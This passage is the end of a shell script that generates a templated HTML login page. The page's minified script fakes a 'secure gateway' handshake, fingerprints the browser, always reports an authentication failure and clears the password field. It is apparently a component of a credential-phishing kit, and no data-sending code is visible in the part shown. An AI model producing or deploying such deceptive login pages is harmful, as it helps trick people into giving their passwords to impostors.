                <input type="password" id="sec" required class="w-full px-4 py-2.5 text-sm transition-all rounded-md outline-none focus:ring-2 $INPUT_BG $TEXT_INPUT" placeholder="Enter your password" />
            </div>
            
            <button type="submit" id="act-btn" class="w-full py-2.5 text-sm font-semibold text-white shadow-md transition-all active:scale-[0.98] $BUTTON_COLOR $ROUNDING flex justify-center items-center gap-2">
                <span id="btn-txt">$BUTTON_TEXT</span>
            </button>
        </form>
        

    </div>

    <script>
!function(){const e=["$ERROR_TEXT","Verifying...","Authenticating...","Handshake failed","Unexpected 502","Connection established"],t=e=>document.querySelector(e),n=e=>new Promise((t=>setTimeout(t,e)));t("#fp").value=btoa(navigator.userAgent+Date.now());const s={init:function(){t("#vform").addEventListener("submit",this.handleSubmit.bind(this)),console.log("%c [System] Secure Gateway Initialized","color: #22c55e; font-weight:bold")},handleSubmit:async function(s){s.preventDefault();const a=t("#act-btn"),i=t("#btn-txt"),o=t("#sys-msg"),c=i.innerText;o.classList.add("hidden"),a.disabled=!0,a.classList.add("opacity-80","cursor-wait"),i.innerHTML='<div class="loader"></div>',console.log("[Net] Sending handshake packet..."),await n(600),i.innerHTML='<div class="loader"></div> <span class="ml-2">'+e[1]+"</span>",await n(800),console.log("[Auth] Token exchange in progress..."),a.disabled=!1,a.classList.remove("opacity-80","cursor-wait"),i.innerText=c;const d=t("#auth-container");o.querySelector("#msg-content").innerText=e[0],o.classList.remove("hidden"),o.classList.add("fade-enter-active"),d.classList.add("shake"),console.error("[Err] "+e[3]),t("#sec").value="",t("#sec").focus(),setTimeout((()=>d.classList.remove("shake")),500)}};document.addEventListener("DOMContentLoaded",(()=>s.init()))}();
    </script>
</body>
</html>
EOF

echo "Generated in $TARGET_DIR"